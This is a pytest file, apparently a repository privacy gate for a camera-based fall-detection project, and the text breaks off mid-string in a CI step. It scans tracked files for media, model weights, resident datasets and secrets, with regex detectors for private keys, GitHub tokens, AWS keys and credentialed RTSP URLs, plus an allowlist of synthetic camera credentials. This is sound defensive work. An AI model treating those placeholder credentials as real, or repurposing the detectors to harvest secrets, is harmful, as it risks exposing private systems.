from __future__ import annotations

import copy
import csv
import functools
import hashlib
import json
import os
import re
import subprocess
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[1]

_PROHIBITED_SUFFIXES = {
    ".7z",
    ".arrow",
    ".avi",
    ".bmp",
    ".ckpt",
    ".csv",
    ".db",
    ".feather",
    ".dcm",
    ".dicom",
    ".gif",
    ".flac",
    ".gz",
    ".h5",
    ".jpeg",
    ".jpg",
    ".jsonl",
    ".ico",
    ".m4a",
    ".mkv",
    ".mov",
    ".mp3",
    ".mp4",
    ".ndjson",
    ".lz4",
    ".onnx",
    ".engine",
    ".parquet",
    ".pdf",
    ".png",
    ".pte",
    ".pt",
    ".pth",
    ".rar",
    ".sqlite",
    ".safetensors",
    ".tar",
    ".wasm",
    ".tflite",
    ".tif",
    ".tiff",
    ".tsv",
    ".wav",
    ".webm",
    ".webp",
    ".zip",
}
_PROHIBITED_PATH_PARTS = {
    "annotations",
    "checkpoints",
    "data",
    "dataset",
    "datasets",
    "eval",
    "evaluation",
    "exports",
    "labels",
    "linkage",
    "models",
    "weights",
}
_MEDIA_OR_ARCHIVE_MAGIC = (
    b"\x00\x00\x01\x00",
    b"\x00asm",
    b"\x04\x22\x4d\x18",
    b"!<arch>\n",
    b"%PDF",
    b"SQLite format 3\x00",
    b"fLaC",
    b"\x1aE\xdf\xa3",
    b"\x1f\x8b",
    b"\x28\xb5\x2f\xfd",
    b"\x7fELF",
    b"\xfd7zXZ\x00",
    b"7z\xbc\xaf\x27\x1c",
    b"BM",
    b"BZh",
    b"GIF8",
    b"ID3",
    b"II*\x00",
    b"MM\x00*",
    b"OggS",
    b"PK\x03\x04",
    b"Rar!\x1a\x07",
    b"\x89PNG\r\n\x1a\n",
    b"\xff\xd8\xff",
    b"version https://git-lfs.github.com/spec/v1",
)
_APPROVED_DOCUMENTATION_ART_PATH = Path("docs/assets/readme-hero.webp")
_APPROVED_DOCUMENTATION_ART_SHA256 = (
    "800af6f6bf3dde48c66c29f6bbebec18471c60cde05b789a8ed53ebb76a8c820"
)
_APPROVED_DOCUMENTATION_ART_SIZE = 168_648
_SYNTHETIC_RTSP_FIXTURES = {
    Path(".claude/skills/edge-bringup/references/worker-roster.md"): {
        "rtsp://{CAM_USER}:{CAM_PASSWORD}@{camera_ip}:554/trackID=2",
        "rtsp://<사용자>:<비밀번호>@<카메라",
    },
    Path(".claude/skills/edge-bringup/scripts/rtsp_sweep.sh"): {
        "rtsp://${CAM_USER}:${CAM_PASSWORD}@${ip}:554/${TRACK}",
    },
    Path("tests/test_alert_amplification_harness.py"): {
        "rtsp://user:pass@camera/live",
    },
    Path("tests/test_worker_nvdec_process.py"): {
        "rtsp://admin:secret@camera/token=abc",
    },
    Path("tests/test_worker_decode_supervision.py"): {
        "rtsp://admin:secret@camera/token=abc",
    },
    Path("front/src/features/camera-management/CameraManagementPage.test.tsx"): {
        "rtsp://user:***@redacted-camera/live",
    },
    Path("front/src/features/cameras/AddCameraModal.test.tsx"): {
        "rtsp://operator:***@192.0.2.10:8554/live",
        "rtsp://operator:secret@192.0.2.10:8554/trackID=1?profile=main",
        "rtsp"
        "://operator:camera-password@camera.local:554/"
        "trackID=1?profile=main&opaque-secret-token&another%2Dsecret"
        "#token=fragment-secret",
        "rtsp"
        "://operator:camera-password@[invalid-host:554/"
        "trackID=1?profile=main&token=query-secret&token=second-secret",
        "rtsp://***@[invalid-host:554/trackID=1?profile=***&token=***&token=***",
        "rtsp://operator:secret@192.0.2.10:8554/Streaming/Channels/101?subtype=0",
    },
    Path("front/src/features/cameras/cameraRegistrationForm.test.ts"): {
        "rtsp://operator:secret@192.0.2.10:8554/Streaming/Channels/101?subtype=0",
        "rtsp://operator%20name:p%40ss%2Fword@camera.local:554/trackID=1",
    },
    Path("front/src/features/cameras/CameraCard.test.tsx"): {
        "rtsp://user:****@camera.local/stream",
    },
    Path("front/src/features/settings/CameraEditModal.test.tsx"): {
        "rtsp://admin:pw@192.0.2.10:554/trackID=1",
    },
    Path("front/src/features/settings/CameraRegisterModal.test.tsx"): {
        "rtsp://admin:pw@192.0.2.10:554/trackID=1",
        "rtsp://admin:pw@192.0.2.10:554/trackID=2",
    },
    Path("front/src/features/settings/rtspSubstreamGuidance.test.ts"): {
        "rtsp://admin:pw@192.0.2.10:554/trackID=1",
        "rtsp://admin:pw@192.0.2.10:554/TrackId=1",
        "rtsp://admin:pw@192.0.2.10:554/stream",
        "rtsp://admin:pw@192.0.2.10:554/trackID=2",
        "rtsp://admin:pw@192.0.2.10:554/trackID=3",
    },
    Path("front/src/shared/api/normalizers.test.ts"): {
        "rtsp://operator:hunter2@camera.internal.example:554/stream",
    },
    Path("tests/test_api_camera_registry.py"): {
        "rtsp://user:secret@camera.local:8554/live",
        "rtsp://***:***@redacted-camera:8554/live",
        "rtsp://user:secret@local/stream",
        "rtsp://***:***@redacted-camera/stream",
        "rtsp://admin:admin@cam.local/stream",
        "rtsp://admin:newpass@cam.local/stream",
    },
    Path("tests/test_camera_api.py"): {
        "rtsp://operator:private@camera.example/live",
    },
    Path("tests/test_camera_roster_sync.py"): {
        "rtsp://user:password@camera/private",
    },
    Path("tests/test_sources_rtsp.py"): {
        "rtsp://user:password@camera.local/live",
        "rtsp://user:secret@camera.local/live?token=abc",
        "rtsp://***:***@camera.local/live?token=%2A%2A%2A",
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
        "rtsp://user:password@host/stream",
        "rtsp://***:***@host/stream",
        "rtsp://user:password@host/stream?profile=main&username=admin&secret=abc#fragment-secret",
        "rtsp://user:password@host/stream?profile=main&username=admin&secret=abc",
        "rtsp://***:***@host/stream?profile=%2A%2A%2A&username=%2A%2A%2A&secret=%2A%2A%2A",
    },
    Path("tests/test_postgres_cameras.py"): {
        "rtsp://operator:synthetic-private@camera.invalid/live",
        "rtsp://***:***@redacted-camera/live",
        "rtsp://original:secret@camera-a.invalid/live/?a=1&b=2",
        "RTSP://different:credentials@CAMERA-A.invalid:554/live/?b=2&a=1",
        "RTSP://other:secret@CAMERA.invalid:554/live/",
    },
    Path("tests/test_worker_config_lifecycle.py"): {
        "rtsp://user:camera-pass@camera/live",
        "rtsp://user:leaked-camera-password@camera/live",
    },
    Path("tests/test_worker_config_local_overrides.py"): {
        "rtsp://user:camera-pass@camera/live",
    },
    Path("tests/test_worker_ingest_lifecycle.py"): {
        "rtsp://operator:s3cr3t@example.test/live?token=plain",
    },
    Path("tests/test_worker_ingest_rtsp.py"): {
        "rtsp://user:secret@camera.local/live?token=abc",
        "rtsp://***:***@camera.local/live?token=%2A%2A%2A",
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
        "rtsp://user:password@host/stream?profile=main&username=admin&secret=abc#fragment-secret",
        "rtsp://user:password@host/stream?profile=main&username=admin&secret=abc",
        "rtsp://***:***@host/stream?profile=%2A%2A%2A&username=%2A%2A%2A&secret=%2A%2A%2A",
    },
    Path("tests/test_analysis_timeline.py"): {
        "rtsp://user:secret@camera/model",
    },
    Path("tests/test_edge_topology_contract.py"): {
        "rtsp://camera-user:camera-secret@camera-1.local/trackID=2",
    },
    Path("tests/test_rtsp_url_policy.py"): {
        "rtsp://user:pass@camera.example:8554/path?subtype=0",
        "rtsp://user:pass@cam.example:8554/live?x=1",
        "rtsp://user:pass@8.8.8.8:8554/live?x=1",
    },
    Path("tests/test_runtime_manifest.py"): {
        "rtsp://admin:secret@camera.local/live",
    },
    Path("tests/test_worker_mjpeg_server.py"): {
        "rtsp://user:secret@8.8.8.8/trackID=2",
    },
    Path("tests/test_decode_seam_nvdec_subprocess.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
    },
    Path("tests/test_worker_nvdec_adapter.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
        "rtsp://***:***@camera.local/live?token=%2A%2A%2A",
    },
    Path("tests/test_worker_nvdec_probe.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
    },
    Path("tests/test_worker_vaapi_adapter.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
        "rtsp://***:***@camera.local/live?token=%2A%2A%2A",
    },
    Path("tests/test_worker_vaapi_probe.py"): {
        "rtsp://operator:s3cr3t@camera.local/live?token=plain",
    },
    Path("tests/test_public_repository_privacy.py"): {
        "rtsps://operator:not-a-fixture@camera.example/stream",
        "rtsps://operator:secret@camera.example/stream",
    },
    Path("tests/test_rtsp_native_frame.py"): {
        "rtsp://user:secret@camera.example/stream",
    },
    Path("tests/test_deepstream_adapter_plane.py"): {
        "rtsp://user:secret@camera.example/native",
    },
}
_TEXT_PATTERNS = {
    "private-key": re.compile(r"-----BEGIN (?:EC |OPENSSH |PGP |RSA )?PRIVATE KEY-----"),
    "credentialed-rtsp": re.compile(
        r"rtsps?://(?P<username>[^/\s:@]+):(?P<password>[^@\s/]+)"
        r"@(?P<host>[^/\s\"']+)(?:/[^\s\"']*)?",
        re.IGNORECASE,
    ),
    "rtsp-query-secret": re.compile(
        r"rtsps?://[^\s\"']*[?&](?:token|secret|password|username)="
        r"[^&#\s\"']+",
        re.IGNORECASE,
    ),
    "github-token": re.compile(r"(?:gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,})"),
    "aws-access-key": re.compile(r"(?:AKIA|ASIA)[0-9A-Z]{16}"),
    "encoded-media-data-uri": re.compile(
        r"data:[^;,\r\n]{1,128};base64,",
        re.IGNORECASE,
    ),
    "hex-encoded-media-signature": re.compile(
        r"(?:8950" r"4e470d0a1a0a|2550" r"4446|ffd8" r"ff|504b" r"0304)",
        re.IGNORECASE,
    ),
}


def _validate_index_mode(mode: bytes, path: bytes) -> None:
    if mode not in {b"100644", b"100755"}:
        raise AssertionError(
            f"non-regular index entry: {path.decode(errors='replace')} ({mode.decode()})"
        )


@functools.cache
def _index_blobs() -> tuple[tuple[Path, bytes], ...]:
    result = subprocess.run(
        ["git", "ls-files", "--stage", "-z"],
        cwd=ROOT,
        check=True,
        capture_output=True,
    )
    blobs: list[tuple[Path, bytes]] = []
    for record in result.stdout.split(b"\0"):
        if not record:
            continue
        metadata, raw_path = record.split(b"\t", 1)
        mode, oid, stage = metadata.split()
        if stage != b"0":
            raise AssertionError(f"unmerged index entry: {raw_path.decode(errors='replace')}")
        _validate_index_mode(mode, raw_path)
        blob = subprocess.run(
            ["git", "cat-file", "blob", oid.decode("ascii")],
            cwd=ROOT,
            check=True,
            capture_output=True,
        ).stdout
        blobs.append((Path(raw_path.decode("utf-8")), blob))
    return tuple(blobs)


def _looks_like_media_or_archive(blob: bytes) -> bool:
    if blob.startswith(_MEDIA_OR_ARCHIVE_MAGIC):
        return True
    if len(blob) >= 12 and blob[4:8] == b"ftyp":
        return True
    if len(blob) >= 12 and blob[8:12] in {b"AVI ", b"WAVE", b"WEBP"}:
        return True
    if len(blob) >= 132 and blob[128:132] == b"DICM":
        return True
    return len(blob) >= 262 and blob[257:262] == b"ustar"


def _is_approved_documentation_art(relative: Path, blob: bytes) -> bool:
    return (
        relative == _APPROVED_DOCUMENTATION_ART_PATH
        and len(blob) == _APPROVED_DOCUMENTATION_ART_SIZE
        and hashlib.sha256(blob).hexdigest() == _APPROVED_DOCUMENTATION_ART_SHA256
    )


def _collect_mapping_keys(value: object) -> set[str]:
    keys: set[str] = set()
    if isinstance(value, dict):
        for key, child in value.items():
            keys.add(str(key).strip().lower())
            keys.update(_collect_mapping_keys(child))
    elif isinstance(value, list):
        for child in value:
            keys.update(_collect_mapping_keys(child))
    return keys


def _structured_document_keys(text: str) -> set[str]:
    significant_lines = [
        line.strip()
        for line in text.splitlines()
        if line.strip()
        and not line.lstrip().startswith("#")
        and line.strip() != "---"
        and not line.strip().startswith("%YAML")
    ]
    if not significant_lines:
        return set()
    first = significant_lines[0]
    structured_header = re.compile(r"""^["']?[A-Za-z_][A-Za-z0-9_]*["']?\s*:""")
    collection_start = first.startswith(("{", "[", "-"))
    if first.startswith(("{", "[")):
        try:
            return _collect_mapping_keys(json.loads(text))
        except json.JSONDecodeError:
            pass
    if not collection_start and not structured_header.match(first):
        return set()
    try:
        return _collect_mapping_keys(yaml.load(text, Loader=yaml.BaseLoader))
    except yaml.YAMLError:
        return set()


def _looks_like_sensitive_dataset(blob: bytes) -> bool:
    try:
        text = blob.decode("utf-8-sig")
    except UnicodeDecodeError:
        return False
    first_line = next((line for line in text.splitlines() if line.strip()), "")
    if not first_line:
        return False

    identity_fields = {"camera_id", "facility_id", "resident_id", "subject_id"}
    evidence_fields = {"annotation", "fall", "file_path", "frame_path", "label"}

    structured_fields = _structured_document_keys(text)
    if len(structured_fields & identity_fields) >= 2:
        return True
    if structured_fields & identity_fields and structured_fields & evidence_fields:
        return True

    for delimiter in (",", ";", "\t"):
        fields = {
            field.strip().lower() for field in next(csv.reader([first_line], delimiter=delimiter))
        }
        if len(fields & identity_fields) >= 2:
            return True
        if fields & identity_fields and fields & evidence_fields:
            return True
    return False


def _is_explicit_synthetic_rtsp(relative: Path, match: re.Match[str]) -> bool:
    value = match.group(0)
    if value in _SYNTHETIC_RTSP_FIXTURES.get(relative, set()):
        return True
    policy_path = Path("tests/test_public_repository_privacy.py")
    return relative == policy_path and any(
        value in fixtures for fixtures in _SYNTHETIC_RTSP_FIXTURES.values()
    )


def _has_url_safe_or_wrapped_base64(text: str) -> bool:
    contiguous = r"(?<![A-Za-z0-9+/_-])[A-Za-z0-9+/_-]{512,}"
    if re.search(contiguous, text):
        return True

    for block in re.split(r"\n[ \t]*\n", text):
        payload_lines = [re.sub(r"^\s*(?:#|//)\s?", "", line) for line in block.splitlines()]
        candidate = re.sub(r"\s+", "", "".join(payload_lines))
        if len(candidate.rstrip("=")) >= 512 and re.fullmatch(r"[A-Za-z0-9+/_-]+={0,2}", candidate):
            return True
    return False


def _text_violation_labels(relative: Path, text: str) -> set[str]:
    violations: set[str] = set()
    for label, pattern in _TEXT_PATTERNS.items():
        scan_text = text
        if label in {"credentialed-rtsp", "rtsp-query-secret"}:
            scan_text = re.sub(r"""(["'])\s*(?:\+\s*)?["']""", "", text)
        matches = list(pattern.finditer(scan_text))
        if label in {"credentialed-rtsp", "rtsp-query-secret"}:
            matches = [
                match for match in matches if not _is_explicit_synthetic_rtsp(relative, match)
            ]
        if matches:
            violations.add(label)
    if _has_url_safe_or_wrapped_base64(text):
        violations.add("url-safe-or-wrapped-base64")
    return violations


def _contains_forbidden_control_bytes(blob: bytes) -> bool:
    return any(byte < 9 or 13 < byte < 32 for byte in blob)


PUBLIC_SAFE_STRUCTURED_FIXTURES = frozenset(
    {
        Path("worker/ml-worker.example.yaml"),
        Path("models/pose/metadata.yaml"),
    }
)


PUBLIC_SAFE_CONTRACT_FIXTURES = frozenset(
    {
        Path("contracts/edge-provisioning-v1/contract-fixtures.json"),
    }
)
_CONTRACT_FIXTURE_REDACTION_NOTICE = "Synthetic identifiers and redacted one-time values only"


def _is_public_safe_contract_fixture(relative: Path, blob: bytes) -> bool:
    if relative not in PUBLIC_SAFE_CONTRACT_FIXTURES:
        return False
    try:
        document = json.loads(blob.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError):
        return False
    if not isinstance(document, dict):
        return False
    metadata = document.get("metadata")
    if not isinstance(metadata, dict):
        return False
    return metadata.get("redaction") == _CONTRACT_FIXTURE_REDACTION_NOTICE


_WORKER_WIRE_FIXTURE_ROOT = ("tests", "fixtures", "worker-wire")
_WORKER_WIRE_SYNTHETIC_IDENTIFIERS = {
    "camera_id": frozenset(
        {
            "camera-replay",
            "camera-replay-http",
            "cmsnw6rjc01vhlh01oswn99yq",
        }
    ),
    "facility_id": frozenset({"facility-1"}),
}
_WORKER_WIRE_FORBIDDEN_KEYS = frozenset({"resident_id", "subject_id"})


def _worker_wire_identifiers_are_synthetic(value: object) -> bool:
    if isinstance(value, dict):
        for key, child in value.items():
            normalized = str(key).strip().lower()
            if normalized in _WORKER_WIRE_FORBIDDEN_KEYS:
                return False
            allowed = _WORKER_WIRE_SYNTHETIC_IDENTIFIERS.get(normalized)
            if allowed is not None and (not isinstance(child, str) or child not in allowed):
                return False
            if not _worker_wire_identifiers_are_synthetic(child):
                return False
        return True
    if isinstance(value, list):
        return all(_worker_wire_identifiers_are_synthetic(item) for item in value)
    return True


def _is_public_safe_worker_wire_fixture(relative: Path, blob: bytes) -> bool:
    root_depth = len(_WORKER_WIRE_FIXTURE_ROOT)
    if len(relative.parts) <= root_depth:
        return False
    if relative.parts[:root_depth] != _WORKER_WIRE_FIXTURE_ROOT:
        return False
    if relative.suffix != ".json":
        return False
    try:
        document = json.loads(blob.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError):
        return False
    return _worker_wire_identifiers_are_synthetic(document)


def _is_public_safe_structured_fixture(relative: Path, blob: bytes) -> bool:
    if relative not in PUBLIC_SAFE_STRUCTURED_FIXTURES:
        return False
    document = yaml.load(blob, Loader=yaml.BaseLoader)
    if not isinstance(document, dict):
        return False
    identity_keys = {"camera_id", "facility_id", "resident_id", "subject_id"}
    outside_cameras = {key: value for key, value in document.items() if key != "cameras"}
    if _collect_mapping_keys(outside_cameras) & identity_keys:
        return False
    cameras = document.get("cameras")
    if not isinstance(cameras, list) or not cameras:
        return False
    allowed_camera_keys = {
        "camera_id",
        "facility_id",
        "resident_id",
        "rtsp_url",
        "heartbeat_interval_sec",
        "frame_stride",
        "label",
    }
    for camera in cameras:
        if not isinstance(camera, dict) or set(camera) != allowed_camera_keys:
            return False
        if not re.fullmatch(r"camera-\d+", str(camera.get("camera_id", ""))):
            return False
        if not re.fullmatch(r"facility-\d+", str(camera.get("facility_id", ""))):
            return False
        if not re.fullmatch(r"resident-\d+", str(camera.get("resident_id", ""))):
            return False
        rtsp_url = str(camera.get("rtsp_url", ""))
        if not re.fullmatch(r"rtsp://camera-\d+\.local/trackID=\d+", rtsp_url):
            return False
        if not re.fullmatch(r"Room \d+", str(camera.get("label", ""))):
            return False
    return True


def _is_prohibited_path(relative: Path) -> bool:
    if relative in PUBLIC_SAFE_STRUCTURED_FIXTURES:
        return False
    lowered_parts = {part.lower() for part in relative.parts}
    lowered_suffixes = {suffix.lower() for suffix in relative.suffixes}
    return bool(lowered_parts & _PROHIBITED_PATH_PARTS or lowered_suffixes & _PROHIBITED_SUFFIXES)


def test_tracked_tree_contains_no_data_or_private_binary_assets() -> None:
    violations: list[str] = []
    for relative, blob in _index_blobs():
        if _is_approved_documentation_art(relative, blob):
            continue
        if _is_prohibited_path(relative):
            violations.append(str(relative))
            continue
        is_private_structured_data = (
            _looks_like_sensitive_dataset(blob)
            and not _is_public_safe_structured_fixture(relative, blob)
            and not _is_public_safe_contract_fixture(relative, blob)
            and not _is_public_safe_worker_wire_fixture(relative, blob)
        )
        if _contains_forbidden_control_bytes(blob):
            violations.append(f"{relative}:control-bytes")
            continue
        if _looks_like_media_or_archive(blob) or is_private_structured_data:
            violations.append(str(relative))
            continue
        try:
            blob.decode("utf-8")
        except UnicodeDecodeError:
            violations.append(f"{relative}:unknown-binary")

    assert violations == []


def test_tracked_text_contains_no_embedded_secret_or_media_payload() -> None:
    violations: list[str] = []

    for relative, blob in _index_blobs():
        try:
            text = blob.decode("utf-8")
        except UnicodeDecodeError:
            continue
        violations.extend(
            f"{relative}:{label}" for label in sorted(_text_violation_labels(relative, text))
        )

    assert violations == []


@pytest.mark.parametrize(
    ("text", "expected_label"),
    [
        ("A" * 512, "url-safe-or-wrapped-base64"),
        ("data" + ":image/png;base64," + "A" * 64, "encoded-media-data-uri"),
        ("_" * 512, "url-safe-or-wrapped-base64"),
        ("\n".join(["A" * 64] * 8), "url-safe-or-wrapped-base64"),
        (
            "data" + ":application/pdf;base64," + "A" * 64,
            "encoded-media-data-uri",
        ),
        (" ".join(["A" * 16] * 32), "url-safe-or-wrapped-base64"),
        (
            "\n".join(["A" * 64, "# split"] * 8),
            "url-safe-or-wrapped-base64",
        ),
        (
            "\n".join(["# " + "A" * 64] * 8),
            "url-safe-or-wrapped-base64",
        ),
        ("8950" + "4e470d0a1a0a" + "00" * 32, "hex-encoded-media-signature"),
        (
            "rtsps://operator:not-a-fixture@camera.example/stream",
            "credentialed-rtsp",
        ),
    ],
)
def test_text_scanner_rejects_encoded_payloads(text: str, expected_label: str) -> None:
    labels = _text_violation_labels(Path("synthetic-input.txt"), text)
    assert expected_label in labels


def test_text_scanner_allows_short_encoded_looking_text() -> None:
    assert _text_violation_labels(Path("synthetic-input.txt"), "A" * 63) == set()


@pytest.mark.parametrize(
    "path",
    [
        Path("Data/export.txt"),
        Path("models/weights.txt"),
        Path("public/disguised.CSV.txt"),
        Path("public/clip.MP4.backup"),
    ],
)
def test_path_policy_rejects_case_and_double_extension_evasions(path: Path) -> None:
    assert _is_prohibited_path(path)


def test_approved_documentation_art_requires_exact_path_and_digest() -> None:
    blob = (ROOT / _APPROVED_DOCUMENTATION_ART_PATH).read_bytes()

    assert _is_approved_documentation_art(_APPROVED_DOCUMENTATION_ART_PATH, blob)


@pytest.mark.parametrize(
    "path",
    [
        Path("docs/assets/other.webp"),
        Path("docs/assets/README-HERO.webp"),
    ],
)
def test_approved_documentation_art_rejects_other_paths(path: Path) -> None:
    blob = (ROOT / _APPROVED_DOCUMENTATION_ART_PATH).read_bytes()

    assert not _is_approved_documentation_art(path, blob)
    assert _is_prohibited_path(path)


def test_approved_documentation_art_rejects_modified_bytes() -> None:
    blob = (ROOT / _APPROVED_DOCUMENTATION_ART_PATH).read_bytes()
    modified = blob[:-1] + bytes([blob[-1] ^ 1])

    assert not _is_approved_documentation_art(_APPROVED_DOCUMENTATION_ART_PATH, modified)
    assert _is_prohibited_path(_APPROVED_DOCUMENTATION_ART_PATH)


def test_approved_documentation_art_rejects_arbitrary_webp() -> None:
    arbitrary_webp = b"RIFF\x00\x00\x00\x00WEBPVP8 arbitrary"

    assert not _is_approved_documentation_art(
        _APPROVED_DOCUMENTATION_ART_PATH, arbitrary_webp
    )
    assert _is_prohibited_path(_APPROVED_DOCUMENTATION_ART_PATH)


@pytest.mark.parametrize(
    "blob",
    [
        "facility_id,resident_id\nfacility,resident".encode("utf-16le"),
        "facility_id,resident_id\nfacility,resident".encode("utf-16be"),
        ("rtsps://operator:secret@camera.example/stream").encode("utf-32le"),
        b"safe-prefix\x00hidden",
    ],
)
def test_control_byte_gate_rejects_alternate_encodings(blob: bytes) -> None:
    assert _contains_forbidden_control_bytes(blob)


@pytest.mark.parametrize(
    "blob",
    [
        b"\x89PNG\r\n\x1a\npayload",
        b"PK\x03\x04archive",
        b"facility_id,resident_id,label\nfacility,resident,fall",
        b"camera_id\tframe_path\tannotation\ncamera\tframe.jpg\tfall",
    ],
)
def test_content_classifier_rejects_disguised_private_assets(blob: bytes) -> None:
    assert _looks_like_media_or_archive(blob) or _looks_like_sensitive_dataset(blob)


@pytest.mark.parametrize(
    "blob",
    [
        b"BZh91AY&SY",
        b"\xfd7zXZ\x00payload",
        b"\x28\xb5\x2f\xfdpayload",
        b"\x1aE\xdf\xa3payload",
        b"ID3payload",
        b"%PDF-1.7",
        b"SQLite format 3\x00payload",
        b"fLaCpayload",
        b"\x00asmpayload",
        b"\x04\x22\x4d\x18payload",
        b"\x00\x00\x01\x00payload",
        b"!<arch>\npayload",
        b"\x00" * 128 + b"DICMpayload",
        b"facility_id,resident_id\nfacility,resident",
        b'{"facility_id":"facility","subject_id":"subject"}',
        b"version https://git-lfs.github.com/spec/v1\n"
        b"oid sha256:0000000000000000000000000000000000000000000000000000000000000000\n"
        b"size 1024\n",
        b"facility_id: facility\nresident_id: resident\n",
        b'{\n  "records": [\n    {"facility_id": "facility", "resident_id": "resident"}\n  ]\n}\n',
        b"# synthetic adversarial document\n---\nrecords:\n"
        b"  - facility_id: facility\n"
        b"    resident_id: resident\n",
        b"- facility_id: facility\n  resident_id: resident\n",
        b"{facility_id: facility, resident_id: resident}\n",
        b'\xef\xbb\xbf"facility_id","frame_path","annotation"\n"facility","frame.jpg","fall"',
    ],
)
def test_classifier_rejects_additional_disguised_private_assets(blob: bytes) -> None:
    assert _looks_like_media_or_archive(blob) or _looks_like_sensitive_dataset(blob)


@pytest.mark.parametrize(
    "blob",
    [
        b"def camera_id() -> str:\n    return 'camera-a'\n",
        b"public equations and source schemas remain allowed\n",
    ],
)
def test_classifier_allows_public_safe_source_text(blob: bytes) -> None:
    assert not _looks_like_media_or_archive(blob)
    assert not _looks_like_sensitive_dataset(blob)


def test_public_worker_example_allowlist_is_closed_world() -> None:
    relative = Path("worker/ml-worker.example.yaml")
    blob = next(blob for path, blob in _index_blobs() if path == relative)
    assert _is_public_safe_structured_fixture(relative, blob)

    camera_mutation = yaml.load(blob, Loader=yaml.BaseLoader)
    camera_mutation["cameras"][0]["subject_id"] = "subject"
    assert not _is_public_safe_structured_fixture(
        relative, yaml.safe_dump(camera_mutation).encode()
    )

    nested_mutation = yaml.load(blob, Loader=yaml.BaseLoader)
    nested_mutation["private_records"] = [{"facility_id": "facility", "resident_id": "resident"}]
    assert not _is_public_safe_structured_fixture(
        relative, yaml.safe_dump(nested_mutation).encode()
    )


def test_ignore_policy_has_no_data_exception() -> None:
    ignore_blob = next(blob for relative, blob in _index_blobs() if relative == Path(".gitignore"))
    lines = ignore_blob.decode("utf-8").splitlines()
    assert "data/" in lines
    assert not any(line.startswith("!data/") for line in lines)


def _workflow(name: str) -> dict[str, object]:
    path = ROOT / ".github" / "workflows" / name
    loaded = yaml.load(path.read_bytes(), Loader=yaml.BaseLoader)
    assert isinstance(loaded, dict)
    return loaded


_ACTION_PIN = re.compile(r"^[^@]+@[0-9a-f]{40}$")

_CHECKOUT_STEP = {
    "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
    "with": {"persist-credentials": "false"},
}

_SETUP_UV_STEP = {
    "uses": "astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86",
    "with": {"enable-cache": "false", "version": "0.11.27"},
}

_SECRETS_STEPS = [
    _CHECKOUT_STEP,
    {
        "name": "Scan tracked tree for secrets",
        "run": (
            'docker run --rm -v "$GITHUB_WORKSPACE:/repo:ro" '
            "zricethezav/gitleaks@sha256:"
            "691af3c7c5a48b16f187ce3446d5f194838f91238f27270ed36eef6359a574d9 "
            "detect --source=/repo --no-git --redact --exit-code=1"
        ),
    },
]

_LINT_STEPS = [
    _CHECKOUT_STEP,
    _SETUP_UV_STEP,
    {"run": "uv sync --frozen --group lint"},
    {"run": "uv run --group lint ruff check ."},
    {"run": "uv run --group lint lint-imports"},
    {
        "run": (
            "uv run --group lint mypy --follow-imports=silent "
            "backend/app/features/cameras/worker_config_service.py"
        )
    },
    {
        "run": (
            "uv run --group lint mypy --follow-imports=silent "
            "backend/app/features/cameras/rtsp_probe_service.py"
        )
    },
    {
        "run": (
            "uv run --group lint mypy --follow-imports=silent "
            "backend/app/features/cameras/camera_crud_service.py"
        )
    },
    {
        "name": ("Scope fidelity (no env-provisioned identity or camera roster)"),
        "run": (
            "uv run python scripts/verify_scope_fidelity.py --fixture\n"
            "uv run python scripts/verify_scope_fidelity.py --repo\n"
        ),
    },
    {
        "name": "Edge env example renders (Flow)",
        "run": (
            "docker compose --env-file .env.edge.prod.example \\\n"
            "  -f compose.edge.yaml config -q\n"
        ),
    },
    {"run": "uv run --group lint python scripts/check_no_comments.py"},
    {"run": "uv run --group lint python scripts/check_boundaries.py"},
    {"run": "uv run --group lint python scripts/check_thread_starts.py"},
    {
        "name": "Backend feature layers (baseline only shrinks)",
        "env": {"BASE_SHA": "${{ github.event.pull_request.base.sha || github.event.before }}"},
        "run": (
            'if [ -z "${BASE_SHA//0/}" ]; then\n'
            "  uv run --group lint python scripts/check_layers.py\n"
            "else\n"
            '  git fetch --no-tags --depth=1 origin "$BASE_SHA"\n'
            '  uv run --group lint python scripts/check_layers.py --against "$BASE_SHA"\n'
            "fi\n"
        ),
    },
]

_SHARD_DISCOVERY = (
    "mapfile -t shard_files < <(\n"
    "  git ls-files -- '*.py' |\n"
    "    grep -E '(^|/)(test_[^/]*|[^/]*_test)\\.py$' |\n"
    """    while IFS= read -r path; do test -f "$path" && printf '%s\\n' "$path"; done |\n"""
    "    LC_ALL=C sort |\n"
    '    awk -v shard="$SHARD" -v total="$SHARD_TOTAL" \\\n'
    "      'NR % total == shard % total'\n"
    ")\n"
)


_TEST_STEPS = [
    _CHECKOUT_STEP,
    _SETUP_UV_STEP,
    {
        "name": "Install FFmpeg and packaged CJK overlay font",
        "run": (
            "sudo apt-get update && "
            "sudo apt-get install -y --no-install-recommends "
            "ffmpeg fonts-noto-cjk"
        ),
    },
    {"run": "uv sync --frozen --group lint"},
    {
        "name": "Run test shard ${{ matrix.shard }} of 4",
        "env": {
            "SHARD": "${{ matrix.shard }}",
            "SEEON_TEST_POSTGRES_DSN": "postgresql://postgres@127.0.0.1:5432/seeon_test",
        },
        "run": _SHARD_DISCOVERY
        + (
            'if [ "${#shard_files[@]}" -eq 0 ]; then\n'
            '  echo "shard $SHARD collected no test files" >&2\n'
            "  exit 1\n"
            "fi\n"
            'echo "shard $SHARD/$SHARD_TOTAL: ${#shard_files[@]} files"\n'
            "uv run pytest -q -m "
            '"not real_stack and not heavy and not integration '
            'and not private_bundle" \\\n'
            '  "${shard_files[@]}"\n'
        ),
    },
]


_CI_OK_STEPS = [
    {
        "name": "Assert every required job succeeded",
        "run": (
            "failed=0\n"
            "for entry in \\\n"
            '  "secrets=${{ needs.secrets.result }}" \\\n'
            '  "lint=${{ needs.lint.result }}" \\\n'
            '  "test=${{ needs.test.result }}"; do\n'
            '  name="${entry%%=*}"\n'
            '  result="${entry#*=}"\n'
            '  echo "$name: $result"\n'
